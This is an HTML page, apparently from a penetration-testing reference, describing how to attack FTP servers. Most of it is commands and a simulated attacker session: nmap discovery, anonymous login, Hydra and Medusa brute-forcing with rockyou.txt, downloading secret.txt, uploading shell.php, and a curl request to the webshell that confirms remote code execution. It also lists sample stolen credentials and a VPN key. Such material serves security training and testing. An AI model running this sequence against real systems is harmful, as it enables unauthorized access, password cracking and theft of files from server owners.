<!-- Title -->
<h1 class="text-2xl font-bold mb-2">FTP Exploitation</h1>
<p class="text-gray-300 mb-4">
  Domain: <strong>Network Security</strong> • Focus: <strong>File Transfer Protocol Attacks</strong> • Last Updated: <strong>2025-09-05</strong>
</p>

<!-- Summary -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Summary</h2>
  <p class="text-gray-300">
    FTP (port 21) is an old protocol used for file transfers. It lacks encryption and 
    often allows anonymous logins, weak credentials, or misconfigured file permissions. 
    Attackers exploit FTP for reconnaissance, data exfiltration, credential brute-forcing, 
    and in some cases, bounce scans or reflection attacks. If write access is available, 
    FTP can even be abused for webshell upload and remote code execution.
  </p>
</section>

<!-- Why Exploitable -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Why Exploitable</h2>
  <ul class="list-disc ml-5 text-gray-200 space-y-2">
    <li><strong>Plaintext Protocol:</strong> Credentials and data transmitted without encryption.</li>
    <li><strong>Anonymous Login:</strong> Many servers allow "ftp/anonymous" with no password.</li>
    <li><strong>Weak Credentials:</strong> Easily brute-forced with common tools.</li>
    <li><strong>Misconfigured Permissions:</strong> Read/write access to sensitive files.</li>
    <li><strong>FTP Bounce Attack:</strong> Abuse of PORT command for port scanning.</li>
  </ul>
</section>

<!-- How Exploitation Works -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">How Exploitation Works</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li><strong>Discovery:</strong> Identify FTP service on port 21 (and 20 for data).</li>
    <li><strong>Anonymous Access:</strong> Test for login with anonymous credentials.</li>
    <li><strong>Brute Force:</strong> Crack weak user accounts with Hydra/Medusa.</li>
    <li><strong>Enumeration:</strong> List directories and files, check upload permissions.</li>
    <li><strong>Abuse:</strong> Upload webshell, exfiltrate sensitive files, or perform bounce scanning.</li>
  </ol>
</section>

<!-- Steps -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Steps</h2>
  <ol class="list-decimal ml-5 text-gray-200 space-y-2">
    <li>Scan for FTP services (port 21).</li>
    <li>Attempt anonymous login.</li>
    <li>Brute-force weak credentials.</li>
    <li>Enumerate and access sensitive files.</li>
    <li>Exploit write access (webshell, persistence, pivoting).</li>
  </ol>
</section>

<!-- Commands -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Commands</h2>
  <pre class="text-sm bg-gray-900 p-3 rounded overflow-x-auto">

# ------------------------------
# Discovery
# ------------------------------
nmap -p 21 -sV --script ftp* [target]       # Scan for FTP service & NSE checks
nmap --script ftp-anon [target]             # Test for anonymous login

# ------------------------------
# Anonymous Login
# ------------------------------
ftp [target]
Username: anonymous
Password: anonymous@

# ------------------------------
# Brute Force
# ------------------------------
hydra -l admin -P rockyou.txt ftp://[target]
medusa -h [target] -u admin -P rockyou.txt -M ftp

# ------------------------------
# Enumeration
# ------------------------------
ftp> ls                                       # List files
ftp> get secret.txt                           # Download sensitive file
ftp> put shell.php                            # Upload file (if allowed)

# ------------------------------
# Bounce Attack
# ------------------------------
nmap -Pn -p 80 [victim] --script ftp-bounce --script-args ftp-bounce.target=[target]

# ------------------------------
# Example Workflow
# ------------------------------
nmap -p 21 192.168.1.50 -sV --script ftp-anon
ftp 192.168.1.50
hydra -l admin -P rockyou.txt ftp://192.168.1.50
ftp> put shell.php
  </pre>
</section>

<!-- Real-World Exploitation Walkthrough -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Real-World Exploitation Walkthrough</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to expand attacker session
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

[ saide ~ ]$ nmap -p 21 -sV --script ftp-anon 192.168.1.50
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (ftp/anon)
|_drwxr-xr-x    2 ftp      ftp          4096 Sep 01 09:00 public

[ saide ~ ]$ ftp 192.168.1.50
Connected to 192.168.1.50.
220 (vsFTPd 3.0.3)
Name (192.168.1.50:saide): anonymous
331 Please specify the password.
Password: anonymous@
230 Login successful.
ftp> ls
200 PORT command successful.
150 Here comes the directory listing.
-rw-r--r--   1 ftp      ftp         1024 Sep 01 09:00 secret.txt
226 Directory send OK.

ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful.
150 Opening data connection.
226 Transfer complete.
1024 bytes received.

[ saide ~ ]$ hydra -l admin -P rockyou.txt ftp://192.168.1.50
[21][ftp] host: 192.168.1.50   login: admin   password: Summer2025!

[ saide ~ ]$ ftp 192.168.1.50
Name (192.168.1.50:saide): admin
331 Please specify the password.
Password: Summer2025!
230 Login successful.
ftp> put shell.php
200 PORT command successful.
150 Ok to send data.
226 Transfer complete.

[ saide ~ ]$ curl http://192.168.1.50/shell.php?cmd=id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </pre>
  </details>
</section>

<!-- Example Results -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4 mb-6">
  <h2 class="text-lg font-semibold mb-2">Example Results</h2>
  <details class="bg-gray-900 rounded p-3">
    <summary class="cursor-pointer text-blue-400 hover:text-blue-300">
      Click to view sample FTP exploitation results
    </summary>
    <pre class="text-sm text-gray-200 mt-3 overflow-x-auto">

# Anonymous Login
Login: ftp/anonymous@
Files: 
- public/readme.txt
- public/secret.txt

# Brute-Force Results
User: admin
Password: Summer2025!

# Sensitive File Contents
secret.txt:
"Internal VPN Key: vpn123!@#secure"

# Uploaded Webshell
shell.php uploaded to /var/www/html/
Execution → Remote Code Execution confirmed:
uid=33(www-data) gid=33(www-data) groups=33(www-data)
    </pre>
  </details>
</section>

<!-- References -->
<section class="bg-gray-800/70 border border-gray-700 rounded-lg p-4">
  <h2 class="text-lg font-semibold mb-2">References</h2>
  <ul class="list-disc ml-5 text-gray-200">
    <li>
      <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-ftp" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        HackTricks – Pentesting FTP
      </a>
    </li>
    <li>
      <a href="https://attack.mitre.org/techniques/T1071/002/" 
         target="_blank" 
         class="text-blue-400 underline hover:text-blue-300">
        MITRE ATT&CK – Application Layer Protocol: FTP
      </a>
    </li>
    <li>Red Team workflow: Anonymous login → File exfiltration → Brute force → Webshell upload → RCE.</li>
  </ul>
</section>
